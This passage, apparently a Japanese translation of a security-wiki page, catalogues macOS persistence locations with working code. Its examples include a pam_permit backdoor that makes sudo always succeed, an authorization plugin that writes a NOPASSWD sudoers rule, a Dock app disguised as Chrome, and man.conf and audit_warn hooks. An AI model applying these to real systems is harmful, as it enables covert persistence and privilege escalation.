Writeup: [https://theevilbit.github.io/beyond/beyond_0024/](https://theevilbit.github.io/beyond/beyond_0024/)\
Writeup: [https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)

- サンドボックスを回避するのに便利: [✅](https://emojipedia.org/check-mark-button)
- ただし、フォルダーアクションを設定するために**`System Events`**に連絡するために引数付きで`osascript`を呼び出す必要があります
- TCCバイパス: [🟠](https://emojipedia.org/large-orange-circle)
- デスクトップ、ドキュメント、ダウンロードなどの基本的なTCC権限があります

#### 場所

- **`/Library/Scripts/Folder Action Scripts`**
- ルート権限が必要
- **トリガー**: 指定されたフォルダーへのアクセス
- **`~/Library/Scripts/Folder Action Scripts`**
- **トリガー**: 指定されたフォルダーへのアクセス

#### 説明と悪用

フォルダーアクションは、フォルダー内のアイテムの追加、削除、またはフォルダーウィンドウの開閉やサイズ変更などの変更によって自動的にトリガーされるスクリプトです。これらのアクションはさまざまなタスクに利用でき、Finder UIやターミナルコマンドを使用して異なる方法でトリガーできます。

フォルダーアクションを設定するには、次のようなオプションがあります：

1. [Automator](https://support.apple.com/guide/automator/welcome/mac)を使用してフォルダーアクションワークフローを作成し、サービスとしてインストールする。
2. フォルダーのコンテキストメニューのフォルダーアクション設定を介してスクリプトを手動で添付する。
3. OSAScriptを利用して`System Events.app`にApple Eventメッセージを送信し、プログラム的にフォルダーアクションを設定する。
- この方法は、アクションをシステムに埋め込むのに特に便利で、持続性のレベルを提供します。

以下のスクリプトは、フォルダーアクションによって実行できるものの例です：
```applescript
// source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
フォルダアクションで上記のスクリプトを使用可能にするには、次のようにコンパイルします:
```bash
osacompile -l JavaScript -o folder.scpt source.js
```
スクリプトがコンパイルされた後、以下のスクリプトを実行してフォルダアクションを設定します。このスクリプトは、フォルダアクションをグローバルに有効にし、特に以前にコンパイルされたスクリプトをデスクトップフォルダに添付します。
```javascript
// Enabling and attaching Folder Action
var se = Application("System Events")
se.folderActionsEnabled = true
var myScript = se.Script({ name: "source.js", posixPath: "/tmp/source.js" })
var fa = se.FolderAction({ name: "Desktop", path: "/Users/username/Desktop" })
se.folderActions.push(fa)
fa.scripts.push(myScript)
```
セットアップスクリプトを実行するには：
```bash
osascript -l JavaScript /Users/username/attach.scpt
```
- これはGUIを介してこの永続性を実装する方法です：

これは実行されるスクリプトです：
```applescript:source.js
var app = Application.currentApplication();
app.includeStandardAdditions = true;
app.doShellScript("touch /tmp/folderaction.txt");
app.doShellScript("touch ~/Desktop/folderaction.txt");
app.doShellScript("mkdir /tmp/asd123");
app.doShellScript("cp -R ~/Desktop /tmp/asd123");
```
`osacompile -l JavaScript -o folder.scpt source.js` を使ってコンパイルします。

移動先:
```bash
mkdir -p "$HOME/Library/Scripts/Folder Action Scripts"
mv /tmp/folder.scpt "$HOME/Library/Scripts/Folder Action Scripts"
```
次に、`Folder Actions Setup`アプリを開き、**監視したいフォルダ**を選択し、あなたの場合は**`folder.scpt`**を選択します（私の場合はoutput2.scpと呼びました）：

<figure><img src="../images/image (39).png" alt="" width="297"><figcaption></figcaption></figure>

今、**Finder**でそのフォルダを開くと、スクリプトが実行されます。

この設定は、**plist**に保存されており、**`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**にbase64形式で格納されています。

では、GUIアクセスなしでこの永続性を準備してみましょう：

1. **`~/Library/Preferences/com.apple.FolderActionsDispatcher.plist`**をバックアップのために`/tmp`にコピーします：
- `cp ~/Library/Preferences/com.apple.FolderActionsDispatcher.plist /tmp`
2. 先ほど設定したフォルダアクションを**削除**します：

<figure><img src="../images/image (40).png" alt=""><figcaption></figcaption></figure>

今、空の環境ができました。

3. バックアップファイルをコピーします：`cp /tmp/com.apple.FolderActionsDispatcher.plist ~/Library/Preferences/`
4. この設定を適用するためにFolder Actions Setup.appを開きます：`open "/System/Library/CoreServices/Applications/Folder Actions Setup.app/"`

> [!CAUTION]
> これは私にはうまくいきませんでしたが、これが書き込みの指示です:(

### Dockショートカット

書き込み: [https://theevilbit.github.io/beyond/beyond_0027/](https://theevilbit.github.io/beyond/beyond_0027/)

- サンドボックスをバイパスするのに便利: [✅](https://emojipedia.org/check-mark-button)
- ただし、システム内に悪意のあるアプリケーションがインストールされている必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `~/Library/Preferences/com.apple.dock.plist`
- **トリガー**: ユーザーがドック内のアプリをクリックしたとき

#### 説明と悪用

ドックに表示されるすべてのアプリケーションは、plist内に指定されています：**`~/Library/Preferences/com.apple.dock.plist`**

**アプリケーションを追加する**ことが可能です：
```bash
# Add /System/Applications/Books.app
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/System/Applications/Books.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'

# Restart Dock
killall Dock
```
いくつかの**ソーシャルエンジニアリング**を使用して、実際に自分のスクリプトを実行するために、ドック内で**Google Chrome**を偽装することができます。
```bash
#!/bin/sh

# THIS REQUIRES GOOGLE CHROME TO BE INSTALLED (TO COPY THE ICON)

rm -rf /tmp/Google\ Chrome.app/ 2>/dev/null

# Create App structure
mkdir -p /tmp/Google\ Chrome.app/Contents/MacOS
mkdir -p /tmp/Google\ Chrome.app/Contents/Resources

# Payload to execute
echo '#!/bin/sh
open /Applications/Google\ Chrome.app/ &
touch /tmp/ImGoogleChrome' > /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

chmod +x /tmp/Google\ Chrome.app/Contents/MacOS/Google\ Chrome

# Info.plist
cat << EOF > /tmp/Google\ Chrome.app/Contents/Info.plist
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>CFBundleExecutable</key>
<string>Google Chrome</string>
<key>CFBundleIdentifier</key>
<string>com.google.Chrome</string>
<key>CFBundleName</key>
<string>Google Chrome</string>
<key>CFBundleVersion</key>
<string>1.0</string>
<key>CFBundleShortVersionString</key>
<string>1.0</string>
<key>CFBundleInfoDictionaryVersion</key>
<string>6.0</string>
<key>CFBundlePackageType</key>
<string>APPL</string>
<key>CFBundleIconFile</key>
<string>app</string>
</dict>
</plist>
EOF

# Copy icon from Google Chrome
cp /Applications/Google\ Chrome.app/Contents/Resources/app.icns /tmp/Google\ Chrome.app/Contents/Resources/app.icns

# Add to Dock
defaults write com.apple.dock persistent-apps -array-add '<dict><key>tile-data</key><dict><key>file-data</key><dict><key>_CFURLString</key><string>/tmp/Google Chrome.app</string><key>_CFURLStringType</key><integer>0</integer></dict></dict></dict>'
killall Dock
```
### カラーピッカー

Writeup: [https://theevilbit.github.io/beyond/beyond_0017](https://theevilbit.github.io/beyond/beyond_0017/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- 非常に特定のアクションが必要
- 別のサンドボックスに入ることになる
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- `/Library/ColorPickers`
- ルート権限が必要
- トリガー: カラーピッカーを使用
- `~/Library/ColorPickers`
- トリガー: カラーピッカーを使用

#### 説明とエクスプロイト

**あなたのコードでカラーピッカー** バンドルをコンパイルし（例えば、[**これを使用できます**](https://github.com/viktorstrate/color-picker-plus)）、コンストラクタを追加します（[スクリーンセーバーセクション](macos-auto-start-locations.md#screen-saver)のように）そしてバンドルを `~/Library/ColorPickers` にコピーします。

その後、カラーピッカーがトリガーされると、あなたのコードも実行されるはずです。

ライブラリを読み込むバイナリは**非常に制限されたサンドボックス**を持っていることに注意してください: `/System/Library/Frameworks/AppKit.framework/Versions/C/XPCServices/LegacyExternalColorPickerService-x86_64.xpc/Contents/MacOS/LegacyExternalColorPickerService-x86_64`
```bash
[Key] com.apple.security.temporary-exception.sbpl
[Value]
[Array]
[String] (deny file-write* (home-subpath "/Library/Colors"))
[String] (allow file-read* process-exec file-map-executable (home-subpath "/Library/ColorPickers"))
[String] (allow file-read* (extension "com.apple.app-sandbox.read"))
```
### Finder Sync Plugins

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0026/](https://theevilbit.github.io/beyond/beyond_0026/)\
**Writeup**: [https://objective-see.org/blog/blog_0x11.html](https://objective-see.org/blog/blog_0x11.html)

- サンドボックスをバイパスするのに役立つ: **いいえ、独自のアプリを実行する必要があるため**
- TCCバイパス: ???

#### Location

- 特定のアプリ

#### Description & Exploit

Finder Sync Extensionを持つアプリケーションの例は[**こちら**](https://github.com/D00MFist/InSync)で見つけることができます。

アプリケーションは`Finder Sync Extensions`を持つことができます。この拡張機能は実行されるアプリケーションの内部に入ります。さらに、拡張機能がそのコードを実行できるようにするためには、**有効なApple開発者証明書で署名されている必要があり**、**サンドボックス化されている必要があり**（ただし、緩和された例外が追加される可能性があります）し、何かに登録されている必要があります。
```bash
pluginkit -a /Applications/FindIt.app/Contents/PlugIns/FindItSync.appex
pluginkit -e use -i com.example.InSync.InSync
```
### スクリーンセーバー

Writeup: [https://theevilbit.github.io/beyond/beyond_0016/](https://theevilbit.github.io/beyond/beyond_0016/)\
Writeup: [https://posts.specterops.io/saving-your-access-d562bf5bf90b](https://posts.specterops.io/saving-your-access-d562bf5bf90b)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- しかし、一般的なアプリケーションのサンドボックスに入ることになります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### ロケーション

- `/System/Library/Screen Savers`
- ルートが必要
- **トリガー**: スクリーンセーバーを選択
- `/Library/Screen Savers`
- ルートが必要
- **トリガー**: スクリーンセーバーを選択
- `~/Library/Screen Savers`
- **トリガー**: スクリーンセーバーを選択

<figure><img src="../images/image (38).png" alt="" width="375"><figcaption></figcaption></figure>

#### 説明 & エクスプロイト

Xcodeで新しいプロジェクトを作成し、新しい**スクリーンセーバー**を生成するためのテンプレートを選択します。次に、コードを追加します。例えば、ログを生成するための以下のコードです。

**ビルド**して、`.saver`バンドルを**`~/Library/Screen Savers`**にコピーします。次に、スクリーンセーバーGUIを開き、それをクリックすると、多くのログが生成されるはずです:
```bash
sudo log stream --style syslog --predicate 'eventMessage CONTAINS[c] "hello_screensaver"'

Timestamp                       (process)[PID]
2023-09-27 22:55:39.622369+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver void custom(int, const char **)
2023-09-27 22:55:39.622623+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView initWithFrame:isPreview:]
2023-09-27 22:55:39.622704+0200  localhost legacyScreenSaver[41737]: (ScreenSaverExample) hello_screensaver -[ScreenSaverExampleView hasConfigureSheet]
```
> [!CAUTION]
> このコードを読み込むバイナリの権限内に（`/System/Library/Frameworks/ScreenSaver.framework/PlugIns/legacyScreenSaver.appex/Contents/MacOS/legacyScreenSaver`）**`com.apple.security.app-sandbox`**が含まれているため、あなたは**一般的なアプリケーションサンドボックス内**にいることになります。

Saver code:
```objectivec
//
//  ScreenSaverExampleView.m
//  ScreenSaverExample
//
//  Created by Carlos Polop on 27/9/23.
//

#import "ScreenSaverExampleView.h"

@implementation ScreenSaverExampleView

- (instancetype)initWithFrame:(NSRect)frame isPreview:(BOOL)isPreview
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
self = [super initWithFrame:frame isPreview:isPreview];
if (self) {
[self setAnimationTimeInterval:1/30.0];
}
return self;
}

- (void)startAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super startAnimation];
}

- (void)stopAnimation
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super stopAnimation];
}

- (void)drawRect:(NSRect)rect
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
[super drawRect:rect];
}

- (void)animateOneFrame
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return;
}

- (BOOL)hasConfigureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return NO;
}

- (NSWindow*)configureSheet
{
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
return nil;
}

__attribute__((constructor))
void custom(int argc, const char **argv) {
NSLog(@"hello_screensaver %s", __PRETTY_FUNCTION__);
}

@end
```
### Spotlight Plugins

writeup: [https://theevilbit.github.io/beyond/beyond_0011/](https://theevilbit.github.io/beyond/beyond_0011/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- しかし、アプリケーションサンドボックスに入ることになります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
- サンドボックスは非常に制限されています

#### Location

- `~/Library/Spotlight/`
- **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
- `/Library/Spotlight/`
- **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
- Rootが必要
- `/System/Library/Spotlight/`
- **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
- Rootが必要
- `Some.app/Contents/Library/Spotlight/`
- **Trigger**: Spotlightプラグインによって管理される拡張子の新しいファイルが作成されます。
- 新しいアプリが必要

#### Description & Exploitation

SpotlightはmacOSの組み込み検索機能であり、ユーザーに**コンピュータ上のデータへの迅速かつ包括的なアクセスを提供する**ことを目的としています。\
この迅速な検索機能を実現するために、Spotlightは**独自のデータベース**を維持し、**ほとんどのファイルを解析することによってインデックスを作成**し、ファイル名とその内容の両方を迅速に検索できるようにしています。

Spotlightの基本的なメカニズムは、**'metadata server'**を意味する中央プロセス「mds」に関与しています。このプロセスは、Spotlightサービス全体を調整します。これに加えて、さまざまなメンテナンスタスクを実行する複数の「mdworker」デーモンがあります（`ps -ef | grep mdworker`）。これらのタスクは、Spotlightがさまざまなファイル形式のコンテンツを理解し、インデックスを作成できるようにするSpotlightインポータープラグイン、または**".mdimporter bundles"**によって可能になります。

プラグインまたは**`.mdimporter`**バンドルは前述の場所にあり、新しいバンドルが現れると、数分以内に読み込まれます（サービスを再起動する必要はありません）。これらのバンドルは、管理できる**ファイルタイプと拡張子**を示す必要があります。これにより、Spotlightは指定された拡張子の新しいファイルが作成されたときにそれらを使用します。

すべての`mdimporters`を見つけることが可能です。
```bash
mdimport -L
Paths: id(501) (
"/System/Library/Spotlight/iWork.mdimporter",
"/System/Library/Spotlight/iPhoto.mdimporter",
"/System/Library/Spotlight/PDF.mdimporter",
[...]
```
例えば **/Library/Spotlight/iBooksAuthor.mdimporter** は、これらのタイプのファイル（拡張子 `.iba` や `.book` など）を解析するために使用されます：
```json
plutil -p /Library/Spotlight/iBooksAuthor.mdimporter/Contents/Info.plist

[...]
"CFBundleDocumentTypes" => [
0 => {
"CFBundleTypeName" => "iBooks Author Book"
"CFBundleTypeRole" => "MDImporter"
"LSItemContentTypes" => [
0 => "com.apple.ibooksauthor.book"
1 => "com.apple.ibooksauthor.pkgbook"
2 => "com.apple.ibooksauthor.template"
3 => "com.apple.ibooksauthor.pkgtemplate"
]
"LSTypeIsPackage" => 0
}
]
[...]
=> {
"UTTypeConformsTo" => [
0 => "public.data"
1 => "public.composite-content"
]
"UTTypeDescription" => "iBooks Author Book"
"UTTypeIdentifier" => "com.apple.ibooksauthor.book"
"UTTypeReferenceURL" => "http://www.apple.com/ibooksauthor"
"UTTypeTagSpecification" => {
"public.filename-extension" => [
0 => "iba"
1 => "book"
]
}
}
[...]
```
> [!CAUTION]
> 他の `mdimporter` の Plist を確認すると、**`UTTypeConformsTo`** エントリが見つからないかもしれません。これは、組み込みの _Uniform Type Identifiers_ ([UTI](https://en.wikipedia.org/wiki/Uniform_Type_Identifier)) であり、拡張子を指定する必要がないためです。
>
> さらに、システムのデフォルトプラグインは常に優先されるため、攻撃者はApple自身の `mdimporters` によってインデックスされていないファイルにのみアクセスできます。

独自のインポーターを作成するには、このプロジェクトから始めることができます: [https://github.com/megrimm/pd-spotlight-importer](https://github.com/megrimm/pd-spotlight-importer) そして名前、**`CFBundleDocumentTypes`** を変更し、サポートしたい拡張子をサポートするために **`UTImportedTypeDeclarations`** を追加し、**`schema.xml`** に反映させます。\
次に、ファイルが処理された拡張子で作成されたときにペイロードを実行するように、関数 **`GetMetadataForFile`** のコードを**変更**します。

最後に、**新しい `.mdimporter` をビルドしてコピー**し、以前のいずれかの場所に配置し、**ログを監視する**か、**`mdimport -L.`** をチェックして、読み込まれているかどうかを確認できます。

### ~~Preference Pane~~

> [!CAUTION]
> これがもう機能していないようです。

Writeup: [https://theevilbit.github.io/beyond/beyond_0009/](https://theevilbit.github.io/beyond/beyond_0009/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- 特定のユーザーアクションが必要です
- TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- **`/System/Library/PreferencePanes`**
- **`/Library/PreferencePanes`**
- **`~/Library/PreferencePanes`**

#### Description

これがもう機能していないようです。

## Root Sandbox Bypass

> [!TIP]
> ここでは、**ルート**として **ファイルに書き込む** ことで何かを単純に実行できる **サンドボックスバイパス** に役立つ開始位置を見つけることができます。また、他の **奇妙な条件** が必要です。

### Periodic

Writeup: [https://theevilbit.github.io/beyond/beyond_0019/](https://theevilbit.github.io/beyond/beyond_0019/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- しかし、ルートである必要があります
- TCC バイパス: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- `/etc/periodic/daily`, `/etc/periodic/weekly`, `/etc/periodic/monthly`, `/usr/local/etc/periodic`
- ルートが必要
- **Trigger**: 時間が来たとき
- `/etc/daily.local`, `/etc/weekly.local` または `/etc/monthly.local`
- ルートが必要
- **Trigger**: 時間が来たとき

#### Description & Exploitation

定期的なスクリプト (**`/etc/periodic`**) は、`/System/Library/LaunchDaemons/com.apple.periodic*` に設定された **launch daemons** によって実行されます。`/etc/periodic/` に保存されたスクリプトは **ファイルの所有者として実行される** ため、これは潜在的な特権昇格には機能しません。
```bash
# Launch daemons that will execute the periodic scripts
ls -l /System/Library/LaunchDaemons/com.apple.periodic*
-rw-r--r--  1 root  wheel  887 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-daily.plist
-rw-r--r--  1 root  wheel  895 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-monthly.plist
-rw-r--r--  1 root  wheel  891 May 13 00:29 /System/Library/LaunchDaemons/com.apple.periodic-weekly.plist

# The scripts located in their locations
ls -lR /etc/periodic
total 0
drwxr-xr-x  11 root  wheel  352 May 13 00:29 daily
drwxr-xr-x   5 root  wheel  160 May 13 00:29 monthly
drwxr-xr-x   3 root  wheel   96 May 13 00:29 weekly

/etc/periodic/daily:
total 72
-rwxr-xr-x  1 root  wheel  1642 May 13 00:29 110.clean-tmps
-rwxr-xr-x  1 root  wheel   695 May 13 00:29 130.clean-msgs
[...]

/etc/periodic/monthly:
total 24
-rwxr-xr-x  1 root  wheel   888 May 13 00:29 199.rotate-fax
-rwxr-xr-x  1 root  wheel  1010 May 13 00:29 200.accounting
-rwxr-xr-x  1 root  wheel   606 May 13 00:29 999.local

/etc/periodic/weekly:
total 8
-rwxr-xr-x  1 root  wheel  620 May 13 00:29 999.local
```
他に定期的に実行されるスクリプトがあり、**`/etc/defaults/periodic.conf`** に示されています：
```bash
grep "Local scripts" /etc/defaults/periodic.conf
daily_local="/etc/daily.local"				# Local scripts
weekly_local="/etc/weekly.local"			# Local scripts
monthly_local="/etc/monthly.local"			# Local scripts
```
もし `/etc/daily.local`、`/etc/weekly.local`、または `/etc/monthly.local` のいずれかのファイルを書き込むことができれば、それは**遅かれ早かれ実行されます**。

> [!WARNING]
> 定期的なスクリプトは**スクリプトの所有者として実行される**ことに注意してください。したがって、通常のユーザーがスクリプトを所有している場合、そのユーザーとして実行されます（これにより特権昇格攻撃が防止される可能性があります）。

### PAM

Writeup: [Linux Hacktricks PAM](../linux-hardening/linux-post-exploitation/pam-pluggable-authentication-modules.md)\
Writeup: [https://theevilbit.github.io/beyond/beyond_0005/](https://theevilbit.github.io/beyond/beyond_0005/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、rootである必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### Location

- 常にrootが必要

#### Description & Exploitation

PAMは**持続性**とマルウェアにより焦点を当てているため、macOS内での簡単な実行にはあまり焦点を当てていません。このブログでは詳細な説明は行いませんので、**この技術をよりよく理解するために書き込みを読んでください**。

PAMモジュールを確認するには:
```bash
ls -l /etc/pam.d
```
PAMを悪用した永続性/特権昇格技術は、/etc/pam.d/sudoモジュールを修正し、最初に次の行を追加するだけで簡単です:
```bash
auth       sufficient     pam_permit.so
```
それは**このように**見えるでしょう:
```bash
# sudo: auth account password session
auth       sufficient     pam_permit.so
auth       include        sudo_local
auth       sufficient     pam_smartcard.so
auth       required       pam_opendirectory.so
account    required       pam_permit.so
password   required       pam_deny.so
session    required       pam_permit.so
```
したがって、**`sudo`を使用する試みはすべて成功します**。

> [!CAUTION]
> このディレクトリはTCCによって保護されているため、ユーザーがアクセスを求めるプロンプトが表示される可能性が非常に高いことに注意してください。

もう一つの良い例はsuで、PAMモジュールにパラメータを渡すことも可能であることがわかります（このファイルにバックドアを仕掛けることもできます）：
```bash
cat /etc/pam.d/su
# su: auth account session
auth       sufficient     pam_rootok.so
auth       required       pam_opendirectory.so
account    required       pam_group.so no_warn group=admin,wheel ruser root_only fail_safe
account    required       pam_opendirectory.so no_check_shell
password   required       pam_opendirectory.so
session    required       pam_launchd.so
```
### 認証プラグイン

Writeup: [https://theevilbit.github.io/beyond/beyond_0028/](https://theevilbit.github.io/beyond/beyond_0028/)\
Writeup: [https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root権限が必要で、追加の設定が必要です
- TCCバイパス: ???

#### 場所

- `/Library/Security/SecurityAgentPlugins/`
- Rootが必要
- プラグインを使用するために認証データベースを構成する必要があります

#### 説明と悪用

ユーザーがログインするときに実行される認証プラグインを作成して、持続性を維持できます。これらのプラグインの作成方法についての詳細は、前の書き込みを確認してください（注意してください、適切に書かれていないとロックアウトされ、リカバリーモードからMacをクリーンアップする必要があります）。
```objectivec
// Compile the code and create a real bundle
// gcc -bundle -framework Foundation main.m -o CustomAuth
// mkdir -p CustomAuth.bundle/Contents/MacOS
// mv CustomAuth CustomAuth.bundle/Contents/MacOS/

#import <Foundation/Foundation.h>

__attribute__((constructor)) static void run()
{
NSLog(@"%@", @"[+] Custom Authorization Plugin was loaded");
system("echo \"%staff ALL=(ALL) NOPASSWD:ALL\" >> /etc/sudoers");
}
```
**バンドル**を読み込む場所に移動します:
```bash
cp -r CustomAuth.bundle /Library/Security/SecurityAgentPlugins/
```
最後に、このプラグインをロードする**ルール**を追加します:
```bash
cat > /tmp/rule.plist <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>class</key>
<string>evaluate-mechanisms</string>
<key>mechanisms</key>
<array>
<string>CustomAuth:login,privileged</string>
</array>
</dict>
</plist>
EOF

security authorizationdb write com.asdf.asdf < /tmp/rule.plist
```
**`evaluate-mechanisms`**は、認証フレームワークに**外部メカニズムを呼び出す必要がある**ことを伝えます。さらに、**`privileged`**は、rootによって実行されるようにします。

次のコマンドでトリガーします:
```bash
security authorize com.asdf.asdf
```
そして、**スタッフグループはsudo**アクセスを持つべきです（確認するには`/etc/sudoers`を読んでください）。

### Man.conf

Writeup: [https://theevilbit.github.io/beyond/beyond_0030/](https://theevilbit.github.io/beyond/beyond_0030/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- しかし、rootである必要があり、ユーザーはmanを使用する必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/private/etc/man.conf`**
- Rootが必要
- **`/private/etc/man.conf`**: manが使用されるたびに

#### 説明とエクスプロイト

設定ファイル**`/private/etc/man.conf`**は、manドキュメントファイルを開くときに使用するバイナリ/スクリプトを示します。したがって、実行可能ファイルへのパスを変更することで、ユーザーがmanを使用してドキュメントを読むたびにバックドアが実行される可能性があります。

例えば、**`/private/etc/man.conf`**に設定されている場合:
```
MANPAGER /tmp/view
```
そして `/tmp/view` を作成します:
```bash
#!/bin/zsh

touch /tmp/manconf

/usr/bin/less -s
```
### Apache2

**Writeup**: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、rootである必要があり、apacheが実行中である必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)
- Httpdには権限がありません

#### Location

- **`/etc/apache2/httpd.conf`**
- Rootが必要
- トリガー: Apache2が起動したとき

#### Description & Exploit

`/etc/apache2/httpd.conf`にモジュールをロードするように指示するために、次のような行を追加できます:
```bash
LoadModule my_custom_module /Users/Shared/example.dylib "My Signature Authority"
```
この方法で、コンパイルされたモジュールがApacheによってロードされます。唯一の条件は、**有効なApple証明書で署名する**か、**システムに新しい信頼された証明書を追加し**、それで**署名する**必要があります。

その後、必要に応じて、サーバーが起動することを確認するために、次のコマンドを実行できます:
```bash
sudo launchctl load -w /System/Library/LaunchDaemons/org.apache.httpd.plist
```
Dylbのコード例:
```objectivec
#include <stdio.h>
#include <syslog.h>

__attribute__((constructor))
static void myconstructor(int argc, const char **argv)
{
printf("[+] dylib constructor called from %s\n", argv[0]);
syslog(LOG_ERR, "[+] dylib constructor called from %s\n", argv[0]);
}
```
### BSM監査フレームワーク

Writeup: [https://theevilbit.github.io/beyond/beyond_0031/](https://theevilbit.github.io/beyond/beyond_0031/)

- サンドボックスをバイパスするのに便利: [🟠](https://emojipedia.org/large-orange-circle)
- ただし、root権限が必要で、auditdが実行中であり、警告を引き起こす必要があります
- TCCバイパス: [🔴](https://emojipedia.org/large-red-circle)

#### 場所

- **`/etc/security/audit_warn`**
- Rootが必要
- **トリガー**: auditdが警告を検出したとき

#### 説明とエクスプロイト

auditdが警告を検出するたびに、スクリプト**`/etc/security/audit_warn`**が**実行されます**。したがって、そこにペイロードを追加することができます。
```bash
echo "touch /tmp/auditd_warn" >> /etc/security/audit_warn
```
`sudo audit -n`を使用して警告を強制することができます。

### スタートアップ項目

> [!CAUTION] > **これは非推奨であるため、これらのディレクトリには何も見つからないはずです。**

**StartupItem**は、`/Library/StartupItems/`または`/System/Library/StartupItems/`のいずれかに配置されるべきディレクトリです。このディレクトリが確立されると、2つの特定のファイルを含む必要があります：

1. **rcスクリプト**：スタートアップ時に実行されるシェルスクリプト。
2. **plistファイル**：特に`StartupParameters.plist`という名前のファイルで、さまざまな設定を含みます。

スタートアッププロセスがこれらを認識し利用できるように、rcスクリプトと`StartupParameters.plist`ファイルの両方が**StartupItem**ディレクトリ内に正しく配置されていることを確認してください。

{{#tabs}}
{{#tab name="StartupParameters.plist"}}
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Description</key>
<string>This is a description of this service</string>
<key>OrderPreference</key>
<string>None</string> <!--Other req services to execute before this -->
<key>Provides</key>
<array>
<string>superservicename</string> <!--Name of the services provided by this file -->
</array>
</dict>
</plist>
```
{{#endtab}}

{{#tab name="superservicename"}}
```bash
#!/bin/sh
. /etc/rc.common

StartService(){
touch /tmp/superservicestarted
}

StopService(){
rm /tmp/superservicestarted
}

RestartService(){
echo "Restarting"
}

RunService "$1"
```
{{#endtab}}
{{#endtabs}}

### ~~emond~~

> [!CAUTION]
> このコンポーネントは私のmacOSでは見つかりませんので、詳細については記事を確認してください。

記事: [https://theevilbit.github.io/beyond/beyond_0023/](https://theevilbit.github.io/beyond/beyond_0023/)

Appleによって導入された**emond**は、未発達または放棄された可能性のあるログ記録メカニズムですが、依然としてアクセス可能です。Mac管理者にとって特に有益ではありませんが、この不明瞭なサービスは、脅威アクターにとって微妙な持続性の手段として機能する可能性があり、ほとんどのmacOS管理者には気づかれないでしょう。

その存在を知っている人にとって、**emond**の悪用を特定することは簡単です。このサービスのシステムのLaunchDaemonは、単一のディレクトリ内で実行するスクリプトを探します。これを調査するには、次のコマンドを使用できます:
```bash
ls -l /private/var/db/emondClients
```
### ~~XQuartz~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0018/](https://theevilbit.github.io/beyond/beyond_0018/)

#### Location

- **`/opt/X11/etc/X11/xinit/privileged_startx.d`**
- Root required
- **Trigger**: With XQuartz

#### Description & Exploit

XQuartzは**macOSにもはやインストールされていません**ので、詳細についてはワ writeupを確認してください。

### ~~kext~~

> [!CAUTION]
> kextをインストールするのは非常に複雑で、ルートとしてもサンドボックスからの脱出や持続性のためには考慮しません（エクスプロイトがない限り）。

#### Location

KEXTをスタートアップアイテムとしてインストールするには、**以下のいずれかの場所にインストールする必要があります**：

- `/System/Library/Extensions`
- OS Xオペレーティングシステムに組み込まれたKEXTファイル。
